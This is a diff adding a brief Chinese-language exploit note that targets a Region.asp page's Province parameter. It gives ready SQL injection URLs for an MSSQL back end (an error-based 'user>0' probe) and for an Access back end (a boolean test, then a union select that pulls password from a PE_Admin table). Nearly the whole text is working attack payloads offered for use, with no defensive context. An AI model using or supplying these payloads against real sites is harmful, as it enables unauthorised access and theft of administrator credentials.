@@ -1,0 +1,12 @@
+MSSQL版本的利用
+
+http://127.0.0.1/Region.asp?Country=tt&City=whytt&Province=shi'+and+user>0--
+
+http://127.0.0.1/Region.asp?Country=tt&City=whytt&Province=shi'后面加上我们的SQL注入语句
+
+ACCESS版本中的利用，
+
+http://127.0.0.1/Region.asp?Country=tt&City=whytt&Province=shi' and 1=1 and '1'='1
+
+
+http://127.0.0.1/Region.asp?Country=tt&City=whytt&Province=shi'+and+1=2+union+select+password+from+PE_Admin+where+1<2+and+'1'='1
